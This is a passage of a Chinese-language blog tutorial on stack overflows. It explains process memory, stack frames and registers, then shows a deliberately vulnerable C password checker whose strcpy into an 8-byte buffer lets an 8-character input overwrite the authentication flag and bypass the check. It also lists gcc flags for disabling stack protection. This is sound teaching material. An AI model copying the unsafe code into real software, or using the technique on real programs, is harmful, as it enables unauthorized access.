<h3 id="二-系统栈的工作原理"><a href="#二-系统栈的工作原理" class="headerlink" title="二.系统栈的工作原理"></a>二.系统栈的工作原理</h3><p>先扔图，网上看到了张图，觉得很形象很生动很详细了</p>
<p><img src="/2018/10/21/栈溢出浅析/linux-memory-segment.jpg" alt=""></p>
<p>依据图中，我们先来看看内存的功能吧。根据不同的操作系统，一个进程可能被分配到不同的内存区域去执行。但是不管什么样的操作系统、什么样的计算机架构，进程使用的内存都可以按照功能大致分成以下 4 个部分。</p>
<ul>
<li>代码区：这个区域存储着被装入执行的二进制机器代码，处理器会到这个区域取指并执行。</li>
<li>数据区：用于存储全局变量等。</li>
<li>堆区：进程可以在堆区动态地请求一定大小的内存，并在用完之后归还给堆区。动态分配和回收是堆区的特点。  </li>
<li>栈区：用于动态地存储函数之间的调用关系，以保证被调用函数在返回时恢复到母函数中继续执行。</li>
</ul>
<blockquote>
<p>   这种简单的内存划分方式是为了让您能够更容易地理解程序的运行机制。</p>
</blockquote>
<p>为了更好的理解进程的内存使用，我们来贴出<code>0day</code>书上的这个图吧</p>
<p><img src="/2018/10/21/栈溢出浅析/memory.PNG" alt=""></p>
<p>在了解了内存相关知识后，接下来，我们再来看看栈，栈是一个数据结构，可以添加或者删除数据，但是得遵循“后进先出的原则，它是通过<code>push</code>操作来把数据压入栈中，通过<code>pop</code>操作删除数据。栈可以实现为一个数组，总是从数组的一端插入和删除元素。</p>
<p>我们来看0day中的一个<code>demo</code>，甩出代码</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">intfunc_B(<span class="keyword">int</span> arg_B1, <span class="keyword">int</span> arg_B2)</span><br><span class="line">&#123;</span><br><span class="line"> <span class="keyword">int</span> var_B1, var_B2;</span><br><span class="line"> var_B1=arg_B1+arg_B2;</span><br><span class="line"> var_B2=arg_B1-arg_B2;</span><br><span class="line"> <span class="keyword">return</span> var_B1*var_B2;</span><br><span class="line">&#125;</span><br><span class="line">intfunc_A(<span class="keyword">int</span> arg_A1, <span class="keyword">int</span> arg_A2)</span><br><span class="line">&#123;</span><br><span class="line"> <span class="keyword">int</span> var_A;</span><br><span class="line"> var_A = func_B(arg_A1,arg_A2) + arg_A1 ;</span><br><span class="line"> <span class="keyword">return</span> var_A;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv, <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"> <span class="keyword">int</span> var_main;</span><br><span class="line"> var_main=func_A(<span class="number">4</span>,<span class="number">3</span>);</span><br><span class="line"> <span class="keyword">return</span> var_main;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>我们来看看该函数在代码区中的分布示意图，甩图</p>
<p><img src="/2018/10/21/栈溢出浅析/code.PNG" alt=""></p>
<p>当 CPU 在执行调用 <code>func_A</code> 函数的时候，会从代码区中 <code>main</code> 函数对应的机器指令的区域跳转到 <code>func_A</code> 函数对应的机器指令区域，在那里取指并执行；当 <code>func_A</code> 函数执行完闭，需要返回的时候，又会跳回到 <code>main</code> 函数对应的指令区域，紧接着调用 <code>func_A</code> 后面的指令继续执行<code>main</code> 函数的代码。来看看取指轨迹示意图：</p>
<p><img src="/2018/10/21/栈溢出浅析/3.PNG" alt=""></p>
<p>这些代码区中精确的跳转都是在于系统栈巧妙地配合过程中完成的，当函数被调用时，系统栈会为这个函数开辟一个新的栈帧，并把它压入栈中。这个栈帧中的内存空间被它所属的函数独占，正常情况下是不会和别的函数共享的。当函数返回时，系统栈会弹出该函数所对应的栈帧。那在调用函数的过程中，伴随的系统栈中的操作如下：</p>
<p><img src="/2018/10/21/栈溢出浅析/4.PNG" alt=""></p>
<p>程序的运行中每一个函数独占自己的栈帧空间，并且正在运行的函数的栈帧总是在栈顶，<code>win32</code>系统提供两个特殊的寄存器用于标识位于系统栈顶端的栈帧。</p>
<ul>
<li><code>ESP</code>：栈指针寄存器(<code>extended stack pointer</code>)，其内存放着一个指针，该指针永远指向系统栈最上面一个栈帧的栈顶。</li>
<li><code>EBP</code>：基址指针寄存器(<code>extended base pointer</code>)，其内存放着一个指针，该指针永远指向系统栈最上面一个栈帧的底部。   </li>
</ul>
<p>寄存器对栈帧的标识作用如图：</p>
<p><img src="/2018/10/21/栈溢出浅析/5.PNG" alt=""></p>
<p> 函数栈帧： <code>ESP</code> 和 <code>EBP</code> 之间的内存空间为当前栈帧， <code>EBP</code> 标识了当前栈帧的底部， <code>ESP</code>标识了当前栈帧的顶部。</p>
<p>而在函数栈帧中，一般包含以下几类重要信息：</p>
<ul>
<li>局部变量：为函数局部变量开辟的内存空间。</li>
<li>保存前栈帧的顶部和底部（实际上只保存前栈帧的底部，前栈帧的顶部可以通过堆栈平衡计算得到），用于在本帧被弹出后恢复出上一个栈帧。   </li>
<li>函数返回地址：保存当前函数调用前的“断点”信息，也就是函数调用前的指令位置，以便在函数返回时能够恢复到函数被调用前的代码区中继续执行指令。   </li>
</ul>
<p>除了与栈相关的寄存器外，还有另一个至关重要的寄存器。</p>
<p><code>EIP</code>：指令寄存器(<code>Extended Instruction Pointer</code>)，其内存放着一个指针，该指针永远指向下一条等待执行的指令地址。</p>
<p>那从安全角度，<code>EIP</code>就很有意思，可以说如果控制了 EIP 寄存器的内容，就控制了进程。</p>
<p>最后，直接甩图函数调用的实现：</p>
<p><img src="/2018/10/21/栈溢出浅析/6.PNG" alt=""></p>
<h3 id="三-一个简单实例"><a href="#三-一个简单实例" class="headerlink" title="三.一个简单实例"></a>三.一个简单实例</h3><p>说干就干，甩代码</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PASSWORD <span class="meta-string">"1234567"</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">verify_password</span> <span class="params">(<span class="keyword">char</span> *password)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"> <span class="keyword">int</span> authenticated;</span><br><span class="line"> <span class="keyword">char</span> buffer[<span class="number">8</span>];         <span class="comment">// add local buffto be overflowed</span></span><br><span class="line"> authenticated=<span class="built_in">strcmp</span>(password,PASSWORD);</span><br><span class="line"> <span class="built_in">strcpy</span>(buffer,password);<span class="comment">//over flowed here!</span></span><br><span class="line"> <span class="keyword">return</span> authenticated;</span><br><span class="line">&#125;</span><br><span class="line">main()</span><br><span class="line">&#123;</span><br><span class="line"> <span class="keyword">int</span> valid_flag=<span class="number">0</span>;</span><br><span class="line"> <span class="keyword">char</span> password[<span class="number">1024</span>];</span><br><span class="line"> <span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line"> &#123;</span><br><span class="line"> <span class="built_in">printf</span>(<span class="string">"please input password: "</span>);</span><br><span class="line"> <span class="built_in">scanf</span>(<span class="string">"%s"</span>,password);</span><br><span class="line"> valid_flag = verify_password(password);</span><br><span class="line"> <span class="keyword">if</span>(valid_flag)</span><br><span class="line"> &#123;</span><br><span class="line"> <span class="built_in">printf</span>(<span class="string">"incorrect password!\n\n"</span>);</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">else</span></span><br><span class="line"> &#123;</span><br><span class="line"> <span class="built_in">printf</span>(<span class="string">"Congratulation! You have passed the verification!\n"</span>);</span><br><span class="line"> <span class="keyword">break</span>;</span><br><span class="line"> &#125;</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这是一个密码验证程序，来看一下该程序的栈帧布局：</p>
<p><img src="/2018/10/21/栈溢出浅析/7.PNG" alt=""></p>
<p>正常来讲当我输入设定好的 <code>&quot;1234567&quot;</code>时，会验证通过；但是该程序段<code>strcpy(buffer,password)</code>存在栈溢出漏洞， 当输入的<code>password`</code>大于7个字符<code>时会让buffer[8]数组越界，</code>buffer[8]，<code></code>buffer[9]<code>，</code>buffer[10]<code>，</code>buffer[11]<code>等......将写入相邻的变量</code>authenticated<code>中，进而越界字符的</code>ASCII<code>码会修改</code>authenticated<code>的值，从程序中就可以看到</code>authenticated<code>变量的值来源于</code>strcmp<code>函数的返回值，之后会返回给</code>main<code>函数作为密码验证成功与否的标志变量：当</code>authenticated` 为 0 时，表示验证成功；反之，验证不成功。那如果这段溢出数据恰好把 authenticated 改为0，则程序流程将被改变。</p>
<p>我们首先来编译改程序，记得关闭<code>linux</code>的栈保护机制</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">gcc -o stack1 stack.c						// 默认情况下，不开启Canary保护</span><br><span class="line">gcc -fno-stack-protector -o stack1 stack.c  //禁用栈保护</span><br><span class="line">gcc -fstack-protector -o stack1 stack.c   //启用堆栈保护，不过只为局部变量中含有 char 数组的函数插入保护代码</span><br><span class="line">gcc -fstack-protector-all -o stack1 stack.c //启用堆栈保护，为所有函数插入保护代码</span><br></pre></td></tr></table></figure>
<p><img src="/2018/10/21/栈溢出浅析/8.PNG" alt=""></p>
<p>我们根据这个程序的漏洞来输入<code>&quot;qqqqqqqq&quot;</code>时，来看运行结果：</p>
<p><img src="/2018/10/21/栈溢出浅析/9.PNG" alt=""></p>
<p>同样，通过验证。此时，我们可以分析到该栈帧数据：</p>
<table>
<thead>
<tr>
<th>局部变量名</th>
<th>内存地址</th>
<th>偏移 3 处的值</th>
<th>偏移 2 处的值</th>
<th>偏移 1 处的值</th>
<th>偏移 0 处的值</th>
</tr>
</thead>
<tbody>
<tr>
<td>buffer[8]</td>
<td>0x0012FB18</td>
<td>0x71 (‘q’)</td>
<td>0x71 (‘q’)</td>
<td>0x71 (‘q’)</td>
<td>0x71 (‘q’)</td>
</tr>
<tr>
<td></td>
<td>0x0012FB1C</td>
<td>0x71 (‘q’)</td>
<td>0x71 (‘q’)</td>
<td>0x71 (‘q’)</td>
<td>0x71 (‘q’)</td>
</tr>
<tr>
<td>authenticated 被覆盖前</td>
<td>0x0012FB20</td>
<td>0x00</td>
<td>0x00</td>
<td>0x00</td>
<td><code>0x01</code></td>
</tr>
<tr>
<td>authenticated 被覆盖后</td>
<td>0x0012FB20</td>
<td>0x00</td>
<td>0x00</td>
<td>0x00</td>
<td><code>0x00</code></td>
</tr>
</tbody>
</table>
<p>故而我们即使不知道正确的密码“ 1234567”，只要输入一个为<code>8</code> 个字符的字符串，那么字符串中隐藏的第 9 个截断符 <code>NULL</code> 就应该能够将 authenticated 低字节中的 <code>1</code> 覆盖成 <code>0</code>，从而绕过验证程序！</p>
<blockquote>
<p>严格说来，并不是任何 8 个字符的字符串都能冲破上述验证程序。由代码中的 <code>authenticated=strcmp(password,PASSWORD)</code>，我们知道 <code>authenticated</code> 的值来源于字符串比较函数 <code>strcmp</code> 的返回值。按照字符串的序关系，当输入的字符串大于<code>&quot;1234567&quot;</code>时，返回 <code>1</code>，这时 <code>authenticated</code>在内存中的值为 <code>0x00000001</code>，可以用字串的截断符 <code>NULL</code>淹没 <code>authenticated</code> 的低位字节而突破验证；当输入字符串小于<code>&quot;1234567&quot;</code>时（例如，<code>&quot;0123&quot;</code>等字符串），函数返回<code>-1</code>，这时 <code>authenticated</code> 在内存中的值按照双字<code>-1</code> 的补码存放，为 <code>0xFFFFFFFF</code>，如果这时也输入 <code>8</code> 个字符的字符串，截断符淹没 <code>authenticated</code>低字节后，其值变为 <code>0xFFFFFF00</code>，所以这时是不能冲破验证程序的。 </p>
</blockquote>
<h3 id="四-参考"><a href="#四-参考" class="headerlink" title="四.参考"></a>四.参考</h3><p>【1】0day 第二版</p>
<p>【2】<a href="https://kevien.github.io/2017/08/16/linux%E6%A0%88%E6%BA%A2%E5%87%BA%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" target="_blank" rel="noopener">https://kevien.github.io/2017/08/16/linux%E6%A0%88%E6%BA%A2%E5%87%BA%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</a></p>
<p><code>Finally!</code></p>
<p><img src="/2018/10/21/栈溢出浅析/do.PNG" alt=""></p>
<p>### </p>

      
    </div>

  </div>

  <div class="article-footer">
    <div class="article-meta pull-left">

    

    
    

    <span class="post-tags">
      <i class="icon-tags"></i>
        <a href="/tags/逆向/">逆向</a>
    </span>
    

    </div>

    
  </div>
</article>




<nav class="pagination">
  
  
  <a href="/page/2/" class="pagination-next">Next</a>
  
</nav>
    </main>

    <footer class="site-footer">
  <p class="site-info">
    Proudly powered by <a href="https://hexo.io/" target="_blank">Hexo</a> and
    Theme by <a href="https://github.com/CodeDaraW/Hacker" target="_blank">Hacker</a>
    </br>
    
    &copy; 2019 fanson
    
  </p>
</footer>
    
  </div>
</div>
<script type="text/javascript" src="/js/src/love.js"></script>
</body>
</html>